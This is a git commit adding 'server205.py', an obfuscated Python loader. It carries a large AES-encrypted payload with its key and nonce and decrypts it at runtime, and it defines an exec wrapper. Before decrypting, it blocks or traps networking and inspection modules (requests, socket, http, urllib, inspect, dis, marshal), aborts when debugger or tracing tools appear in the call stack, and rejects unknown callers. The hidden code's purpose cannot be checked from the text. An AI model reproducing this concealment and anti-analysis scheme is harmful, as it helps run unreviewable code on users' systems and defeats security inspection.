5597d64c9de2928e5f015adef34a9391a12b68fb
serverbywhite <nsnjsjsnidraokdkdkdj@gmail.com>
2025-09-26 11:54:20 +0700

    Add server205.py

---
+++ server205.py
@@ -0,0 +1,119 @@
+# -*- coding: utf-8 -*-
+#!/usr/bin/env python3
+__𝑨𝑼𝑻𝜢𝜪𝑹__ = ["𝑾𝑯𝑰𝑻𝑬 𝑵𝑵 × 𝑱𝑼𝑵𝑰𝑫𝑶 𝑲𝑨𝑰 × 𝑴𝑰𝑵𝑯𝑨𝑵𝑯𝑺"]
+__𝑼𝑺𝑬𝑹__ = ["Shin"]
+__𝑬𝜨𝑪__ = ["Shadow"]
+__𝑴𝑶𝑫𝑬__ = ["𝑶𝑩𝑭 × 𝑬𝑵𝑪"]
+__𝑽𝑬𝑹𝑺𝑰𝑶𝑵__ = ["242.26.711"]
+__𝑾𝒂𝒓𝒏𝒊𝒏𝒈__ = ["ENC này không hỗ trợ mạnh chỉ dùng cho backend khuyến cáo lên sài ENC 𝙋𝙮𝙈𝙖𝙆𝙖𝙞𝙯𝙪"]
+__𝑾𝒂𝒓𝒏𝒊𝒏𝒈__ = ["Từ chối khiếu lại về nội dung được mã hóa vì chúng tôi chỉ cung cấp mã hóa"]
+
+ᅠ = (lambda: vars(__builtins__)["".join(chr(i) for i in [95,95,105,109,112,111,114,116,95,95])])()
+inspect = ᅠ("".join(chr(i) for i in [105,110,115,112,101,99,116]))
+_real_inspect = __import__("".join(map(chr,[105,110,115,112,101,99,116])))
+base64 = ᅠ("".join(chr(i) for i in [98,97,115,101,54,52]))
+AES = getattr(ᅠ("".join(chr(i) for i in [67,114,121,112,116,111,100,111,109,101,46,67,105,112,104,101,114]), fromlist=["AES"]), "AES")
+RSA = getattr(ᅠ("".join(chr(i) for i in [67,114,121,112,116,111,100,111,109,101,46,80,117,98,108,105,99,75,101,121]), fromlist=["RSA"]), "RSA")
+
+key = base64.b64decode(b'5Jm66hqV7UM/cgJ96+tvhfkbnVy45H+5++yHRRQIlc8=')
+nonce = base64.b64decode(b'XXIzRBnjLno=')
+ciphertext = base64.b64decode(b'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')
+signature = base64.b64decode(b'clWx02yeEfY8SpAxe+LpQzZtKrA7IrjfqKQ+wm1R7iM1BOSxbdfbFMvOPqCd+046YHSc+PrvlQiwMSwJkZp85k5SEuFxMyyVxwtBeeHcIYG6k8gDrvdyXqt+ZsAQMtAvLMOZW+etIFUzHJ2frb3NGgbIWtA8VVPDnXN7nvA7d2cgIKg+DtRgXqQ6Ah2p305CqCiwAvsaTrhXIsVxCvyB5JqCBoAgKX+9gGp3e4q5fxUQfNnmyHeBxU74hB2XRo2GRpzgo7BJOewLJH2gXXVhRuP7L60e2o6ayNT1qHROlv3xMVvuRohbK+1i7ZD2c2pMheEvG4cUvXz8LrOt6/Tg6H+6sQCvkdY7FMMWTYNH5N1/I4zuaD/vcz9NjoTQwdUDyzsgmt1BPfNgP/8nGDNWfr5TEWVbTjt3nYyVgehQp25C9S414W7MB3O6h31mn9L/Dhgeq480mgE8REX2Iwawp37kxbLIPKaHO8WgHyIKO2qpMnR9ecS46BVpT9nBttd0')
+public_key = RSA.import_key(base64.b64decode(b'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQm9qQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FZOEFNSUlCaWdLQ0FZRUFzOVBTQmd5aEZsczVLNWlEV2dsbQpVcUV4V0dOQm5neDUxOWZLbzNsKzMxUktnV21JZnkrbitIVjFUM3l4VEFGQ3NDd3lGdlpUQUxUSk5pdUdlYU5tClJOQm9id3lXdUY4d1Q5NFR2eW4rYVJtbmcxSmpEQlBrNGtGM1lBSmJaWXBJY0dQZk1hUFBJWWRIVVdHMGFRcGYKL1ZNL0U0ejBMMzdrYXorMW1uZzFLYUpQbHNzT05sY1E3dklPRXpWaVpQVDNhQkFEMXNJTWZodWsxMFZ3a25lZQpQYmhTOXZIZnBJT3V5Z2VWYmNwRGoyQ0NtcjJSUVRLTVR5R2NkQlZObkpuWkQrNDVsampXU0pYSXU1UXVsaDc4CmgzMEhTanJubDg1alVzVVBWMXJCbCtNSVVQWFFTZ0JsYmNkQnExZVlSVVprMHRITWs5TTV3ck9QemR4MkM5UGoKckNsTDlQL1Q1NThZMnM3bnduS3pWNnpZYzUxYTUrRzZNL3dpbzIyeGxZTmNIOWRmeVdLRG95bXpTVHA2d0Z0awpzbS9jK0lDek1lcytITjQ4WnFlOEVlQ1lFaDhxekErZXI3cVVKVi80YUxHNGVEdnYvMXlIck9MQ0w2QXlWaGRDCnpvSytWVGlwakRqM2lpWUgxWS8zN3lva0hWRGRJTGFYdDNUQ1o5YzZUME5CQWdNQkFBRT0KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'))
+
+zezoire = (lambda names: (lambda code: (__import__("builtins").exec(code, __import__("builtins").globals()) if names[0] not in _real_inspect.currentframe().f_code.co_names else (_ for _ in ()).throw(MemoryError("Tamper")))))(["".join(chr(i) for i in [112,114,105,110,116]),"".join(chr(i) for i in [101,120,101,99]),"".join(chr(i) for i in [103,108,111,98,97,108,115])])
+_sys = __import__("".join(map(chr,[115,121,115])))
+_block_list = ["".join(map(chr,[105,110,115,112,101,99,116])),"".join(map(chr,[100,105,115])),"".join(map(chr,[109,97,114,115,104,97,108])),"".join(map(chr,[114,101,113,117,101,115,116,115])),"".join(map(chr,[104,116,116,112])),"".join(map(chr,[104,116,116,112,46,99,108,105,101,110,116])),"".join(map(chr,[117,114,108,108,105,98])),"".join(map(chr,[115,111,99,107,101,116]))]
+_orig_modules = {m: _sys.modules.get(m) for m in _block_list}
+_err_block = "".join(map(chr,[72,84,84,80,47,72,111,111,107,32,68,101,116,101,99,116,101,100]))
+_err_builtin = "".join(map(chr,[78,111,116,32,111,114,105,103,105,110,97,108,32,98,117,105,108,116,105,110,115]))
+_err_caller = "".join(map(chr,[85,110,97,117,116,104,111,114,105,122,101,100,32,99,97,108,108,101,114]))
+_err_dump = "".join(map(chr, [84, 72, 65, 78, 71, 32, 68, 69, 32, 78, 65, 89, 32, 75, 72, 65, 32, 68, 65, 89, 33, 33, 33]))
+_Block = type("".join(map(chr,[95,66,108,111,99,107])),(),{"__getattr__": (lambda self,name: (_ for _ in ()).throw(MemoryError(_err_block))),"__call__": (lambda self,*a,**k: (_ for _ in ()).throw(MemoryError(_err_block)))})
+
+try:
+    
+    import sys
+    _types = __import__("".join(map(chr,[116,121,112,101,115])))
+    _ModuleType = getattr(_types, "".join(map(chr,[77,111,100,117,108,101,84,121,112,101])))
+    _real_requests = __import__("".join(map(chr,[114,101,113,117,101,115,116,115])))
+    _real_inspect = __import__("".join(map(chr,[105,110,115,112,101,99,116])))
+    _real_stack = getattr(_real_inspect, "".join(map(chr,[115,116,97,99,107])))
+    _make_safe_requests = (lambda _r, _stackf:
+        type("".join(map(chr, [95,85,108,116,114,97,83,97,102,101,82,101,113,117,101,115,116,115])),
+             (_ModuleType,),
+            {
+                 "__getattribute__": (lambda self, name: (
+                     (lambda: (
+                         (lambda func:
+                             (lambda *a, **k: (
+                                 (lambda: [
+                                      (_ for _ in ()).throw(MemoryError("Tamper detected: requests hook"))
+                                     if any(
+                                         x in getattr(f, "".join(map(chr, [102,105,108,101,110,97,109,101])), "<unknown>").lower()
+                                     for x in (
+                                         "".join(map(chr, [109,97,114,115,104,97,108])),
+                                         "".join(map(chr, [104,111,111,107])),
+                                         "".join(map(chr, [112,121,100,101,118])),
+                                         "".join(map(chr, [100,101,98,117,103])),
+                                         "".join(map(chr, [116,114,97,99,101,109,97,108,108,111,99])),
+                                         "".join(map(chr, [112,100,98]))
+                                     )
+                                 ) else None
+                                 for f in _stackf()
+                             ]) or func(*a, **k)
+                         ))
+                     )(getattr(_r, name))
+                 ))() if name in (
+                     "".join(map(chr, [103,101,116])),
+                     "".join(map(chr, [112,111,115,116])),
+                     "".join(map(chr, [112,117,116])),
+                     "".join(map(chr, [100,101,108,101,116,101])),
+                     "".join(map(chr, [104,101,97,100])),
+                     "".join(map(chr, [111,112,116,105,111,110,115])),
+                     "".join(map(chr, [114,101,113,117,101,115,116]))
+                 ) else (
+                     (_ for _ in ()).throw(MemoryError("Tamper detected: requests Session"))
+                     if name == "".join(map(chr, [83,101,115,115,105,111,110]))
+                     else getattr(_r, name)
+                 )
+             ))
+         }
+    )("".join(map(chr, [114,101,113,117,101,115,116,115])))
+)(_real_requests, _real_stack)
+
+    sys.modules["".join(map(chr, [114,101,113,117,101,115,116,115]))] = _make_safe_requests
+    
+    for m in _block_list:
+        _sys.modules[m] = _Block()
+
+    _blt = __builtins__ if isinstance(__builtins__, dict) else vars(__builtins__)
+    _se = eval("".join(map(chr,[101,120,101,99])))
+    _si = eval("".join(map(chr,[95,95,105,109,112,111,114,116,95,95])))
+    _so = eval("".join(map(chr,[111,112,101,110])))
+
+    (lambda: ((_ for _ in ()).throw(MemoryError(_err_builtin)) if eval("".join(map(chr,[101,120,101,99]))) is not _se or eval("".join(map(chr,[95,95,105,109,112,111,114,116,95,95]))) is not _si or eval("".join(map(chr,[111,112,101,110]))) is not _so else None))()
+
+    _bad = [''.join([chr(c) for c in [116,114,97,99,101,109,97,108,108,111,99]]),''.join([chr(c) for c in [112,105,99,107,108,101]]),''.join([chr(c) for c in [100,105,108,108]]),''.join([chr(c) for c in [103,99]]),''.join([chr(c) for c in [103,101,116,115,111,117,114,99,101]])]
+    for _f in _real_inspect.stack():
+        if any(b in str(_f).lower() for b in _bad):
+            raise MemoryError(_err_dump)
+
+    _caller = (lambda f: (f[1].filename if len(f) > 1 else f[0].filename))(_real_inspect.stack())
+    _allowed = ["".join(map(chr,[115, 101, 114, 118, 101, 114, 50, 48, 53, 46, 112, 121])),"".join(map(chr,[60,115,116,100,105,110,62]))]
+    if not any(ok in str(_caller) for ok in _allowed):
+        raise MemoryError(_err_caller)
+
+    _decrypted = (lambda M, K, N, C: getattr(__import__(M, fromlist=[K]),"".join(map(chr,[110,101,119])))(key, getattr(__import__(M, fromlist=[K]),"".join(map(chr,[77,79,68,69,95,67,84,82]))),**{ "".join(map(chr,[110,111,110,99,101])): N }).__getattribute__("".join(map(chr,[100,101,99,114,121,112,116])))(C))("".join(map(chr,[67,114,121,112,116,111,100,111,109,101,46,67,105,112,104,101,114,46,65,69,83])),"".join(map(chr,[65,69,83])),nonce,ciphertext)
+
